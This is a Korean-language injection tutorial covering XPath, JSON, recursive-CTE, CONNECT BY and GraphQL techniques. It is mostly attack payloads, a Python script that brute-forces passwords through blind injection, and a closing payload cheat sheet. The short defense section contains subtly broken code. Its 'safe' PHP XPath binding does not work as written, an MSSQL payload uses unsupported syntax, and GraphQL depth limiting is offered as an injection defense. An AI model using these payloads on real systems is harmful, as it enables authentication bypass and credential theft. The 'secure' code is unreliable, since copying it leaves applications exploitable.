Rooted-based SQL Injection

Rooted-based SQLi는 XML, JSON 등 구조화된 데이터 형식을 이용한 SQL Injection과 관련 고급 기법을 다룹니다.

개념 (Concept)​

Rooted-based SQLi란?​

Rooted-based SQL Injection은 데이터베이스의 계층 구조 또는 트리 구조 기능을 악용하는 기법입니다:

  • XML 기반 공격 (XPATH Injection)
  • JSON 기반 공격
  • Recursive CTE 공격
  • 계층 쿼리 공격 (Oracle CONNECT BY)

사용 시나리오​

  • XML/JSON을 처리하는 API
  • NoSQL과 SQL의 혼합 환경
  • 복잡한 데이터 구조를 가진 애플리케이션

XML 기반 SQL Injection​

XPATH Injection​

기본 개념​

XPATH는 XML 문서에서 데이터를 찾는 쿼리 언어입니다.

XML 예시:

<users>
  <user>
    <username>admin</username>
    <password>5f4dcc3b5aa765d61d8327deb882cf99</password>
    <role>admin</role>
  </user>
  <user>
    <username>user1</username>
    <password>098f6bcd4621d373cade4e832627b4f6</password>
    <role>user</role>
  </user>
</users>

정상 XPATH 쿼리:

//user[username='admin' and password='password123']

XPATH Injection:

//user[username='admin' or '1'='1' and password='anything']

→ 모든 사용자 반환

인증 우회​

취약한 코드 (PHP):

$username = $_POST['username'];
$password = $_POST['password'];

$xpath = "//user[username='$username' and password='$password']";
$result = $xml->xpath($xpath);

if ($result) {
    // 로그인 성공
}

공격 페이로드:

Username: admin' or '1'='1
Password: anything

생성되는 XPATH:

//user[username='admin' or '1'='1' and password='anything']

→ 인증 우회 성공

Blind XPATH Injection​

데이터 추출 (Boolean-based):

Username: admin' and substring(password,1,1)='5
Password: (anything)

생성되는 XPATH:

//user[username='admin' and substring(password,1,1)='5' and password='anything']
  • 응답 성공 → 첫 번째 문자는 '5'
  • 응답 실패 → 다른 문자

자동화 스크립트 (Python):

import requests
import string

url = "http://example.com/login"
password = ""
charset = string.hexdigits

for position in range(1, 50):
    for char in charset:
        payload = f"admin' and substring(password,{position},1)='{char}"

        r = requests.post(url, data={
            "username": payload,
            "password": "anything"
        })

        if "Welcome" in r.text:
            password += char
            print(f"[+] Password: {password}")
            break
    else:
        break

print(f"[+] Final password: {password}")

XPATH 함수 악용​

# 문자열 길이
count(//user)  -- 사용자 수
string-length(//user[1]/password)  -- 비밀번호 길이

# 노드 존재 여부
name(//user[1]/*)  -- 첫 번째 자식 노드 이름
count(//user[role='admin'])  -- 관리자 수

SQL에서 XML 처리​

MySQL - ExtractValue​

XML 데이터 추출:

SELECT ExtractValue('<user><name>admin</name></user>', '/user/name')

Error-based SQLi와 결합:

' AND ExtractValue(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--

출력:

XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf99'

MSSQL - XML 처리​

FOR XML PATH:

SELECT username + ':' + password FROM users FOR XML PATH('')

SQLi 페이로드:

' UNION SELECT NULL, (SELECT username+':'+password FROM users FOR XML PATH(''))--

JSON 기반 SQL Injection​

JSON 함수 악용​

MySQL JSON 함수 (5.7+)​

데이터 저장:

CREATE TABLE users (
    id INT,
    data JSON
);

INSERT INTO users VALUES (1, '{"username":"admin","password":"hash","role":"admin"}');

쿼리:

SELECT JSON_EXTRACT(data, '$.username') FROM users WHERE JSON_EXTRACT(data, '$.role')='admin'

SQLi 페이로드:

' OR JSON_EXTRACT(data, '$.role')='admin'--
' UNION SELECT JSON_EXTRACT(data, '$.password') FROM users--

PostgreSQL JSONB​

데이터 저장:

CREATE TABLE users (
    id SERIAL,
    data JSONB
);

INSERT INTO users VALUES (1, '{"username":"admin","password":"5f4dcc3b","role":"admin"}');

쿼리:

SELECT data->>'username' FROM users WHERE data->>'role'='admin'

SQLi 페이로드:

' OR data->>'role'='admin'--
' UNION SELECT data->>'password' FROM users--

JSON API Injection​

취약한 API:

// Node.js + Express
app.post('/login', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;

    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
    db.query(query, (err, result) => {
        if (result.length > 0) {
            res.json({success: true});
        }
    });
});

공격 요청:

POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{
    "username": "admin' OR '1'='1",
    "password": "anything"
}

생성되는 쿼리:

SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'

→ 인증 우회

Recursive CTE (Common Table Expression)​

PostgreSQL / MSSQL​

Recursive CTE는 자기 자신을 참조하는 쿼리:

WITH RECURSIVE t(n) AS (
    SELECT 1
    UNION ALL
    SELECT n+1 FROM t WHERE n < 10
)
SELECT n FROM t;

출력: 1, 2, 3, ..., 10

Time-based SQLi에 활용​

MSSQL:

'; WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 10000000) SELECT n FROM t--

→ 수백만 번 재귀 호출로 시간 지연

계층 구조 데이터 추출​

조직도 예시:

CREATE TABLE employees (
    id INT,
    name VARCHAR(100),
    manager_id INT
);

INSERT INTO employees VALUES
(1, 'CEO', NULL),
(2, 'CTO', 1),
(3, 'Dev1', 2),
(4, 'Dev2', 2);

Recursive CTE로 전체 계층 추출:

WITH RECURSIVE org_chart AS (
    SELECT id, name, manager_id, 1 AS level
    FROM employees
    WHERE manager_id IS NULL

    UNION ALL

    SELECT e.id, e.name, e.manager_id, oc.level + 1
    FROM employees e
    JOIN org_chart oc ON e.manager_id = oc.id
)
SELECT * FROM org_chart;

SQLi 페이로드:

' UNION SELECT name, NULL, NULL, NULL FROM (WITH RECURSIVE org_chart AS (...) SELECT name FROM org_chart)--

Oracle CONNECT BY (계층 쿼리)​

기본 사용법​

계층 구조 조회:

SELECT LEVEL, LPAD(' ', 2*(LEVEL-1)) || name AS employee
FROM employees
START WITH manager_id IS NULL
CONNECT BY PRIOR id = manager_id;

출력:

1  CEO
2    CTO
3      Dev1
3      Dev2

SQLi 악용​

데이터 반복 추출:

' UNION SELECT LEVEL FROM dual CONNECT BY LEVEL <= 100--

→ 1부터 100까지 숫자 생성

문자열 분할 추출:

' UNION SELECT SUBSTR(password, LEVEL, 1) FROM users CONNECT BY LEVEL <= LENGTH(password)--

→ 비밀번호를 한 글자씩 분리

GraphQL Injection​

GraphQL이란?​

GraphQL은 API 쿼리 언어로, RESTful API의 대안입니다.

정상 쿼리:

{
  user(id: 1) {
    username
    email
  }
}

GraphQL Injection​

취약한 백엔드 (Node.js):

const resolvers = {
    Query: {
        user: (parent, args) => {
            const query = `SELECT * FROM users WHERE id=${args.id}`;
            return db.query(query);
        }
    }
};

공격 쿼리:

{
  user(id: "1 OR 1=1") {
    username
    password
  }
}

생성되는 SQL:

SELECT * FROM users WHERE id=1 OR 1=1

→ 모든 사용자 정보 노출

GraphQL Introspection 악용​

스키마 정보 수집:

{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

응답:

{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "User",
          "fields": [
            {"name": "id", "type": {"name": "Int"}},
            {"name": "username", "type": {"name": "String"}},
            {"name": "password", "type": {"name": "String"}},
            {"name": "role", "type": {"name": "String"}}
          ]
        }
      ]
    }
  }
}

→ 숨겨진 필드 발견 (password)

실전 공격 시나리오​

시나리오: XML API 공격​

대상: SOAP XML API

정상 요청:

<soapenv:Envelope>
  <soapenv:Body>
    <login>
      <username>admin</username>
      <password>password123</password>
    </login>
  </soapenv:Body>
</soapenv:Envelope>

공격 요청:

<soapenv:Envelope>
  <soapenv:Body>
    <login>
      <username>admin' or '1'='1</username>
      <password>anything</password>
    </login>
  </soapenv:Body>
</soapenv:Envelope>

백엔드 쿼리:

SELECT * FROM users WHERE username='admin' or '1'='1' AND password='anything'

→ 인증 우회 성공

방어 기법​

1. Parameterized Queries​

취약한 코드 (XPATH):

$xpath = "//user[username='$username' and password='$password']";

안전한 코드:

$xpath = "//user[username=\$u and password=\$p]";
$xml->registerXPathNamespace('var', 'http://example.com/vars');
$result = $xml->xpath($xpath, ['u' => $username, 'p' => $password]);

2. Input Validation​

// XML 특수문자 이스케이프
$username = htmlspecialchars($username, ENT_XML1);

// JSON 검증
$data = json_decode($input, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    die("Invalid JSON");
}

3. GraphQL Depth Limiting​

const depthLimit = require('graphql-depth-limit');

const server = new ApolloServer({
    typeDefs,
    resolvers,
    validationRules: [depthLimit(5)]  // 최대 5단계
});

빠른 명령어 참조​

XPATH Injection​

# 인증 우회
admin' or '1'='1
' or 1=1 or '1'='1

# Blind Injection
admin' and substring(password,1,1)='a
admin' and string-length(password)>5

# 함수 악용
' or count(//user)>0 or '1'='1

SQL XML Functions​

# MySQL ExtractValue
' AND ExtractValue(1, CONCAT(0x7e, (SELECT password FROM users)))--

# MSSQL FOR XML PATH
' UNION SELECT NULL, (SELECT username+':'+password FROM users FOR XML PATH(''))--

# PostgreSQL xmlelement
' UNION SELECT xmlelement(name user, username||':'||password) FROM users--

JSON Functions​

# MySQL JSON
' OR JSON_EXTRACT(data, '$.role')='admin'--
' UNION SELECT JSON_EXTRACT(data, '$.password') FROM users--

# PostgreSQL JSONB
' OR data->>'role'='admin'--
' UNION SELECT data->>'password' FROM users--

Recursive CTE​

# PostgreSQL Time-delay
'; WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n<10000000) SELECT n FROM t--

# 데이터 반복
' UNION SELECT LEVEL FROM dual CONNECT BY LEVEL<=100--  -- Oracle
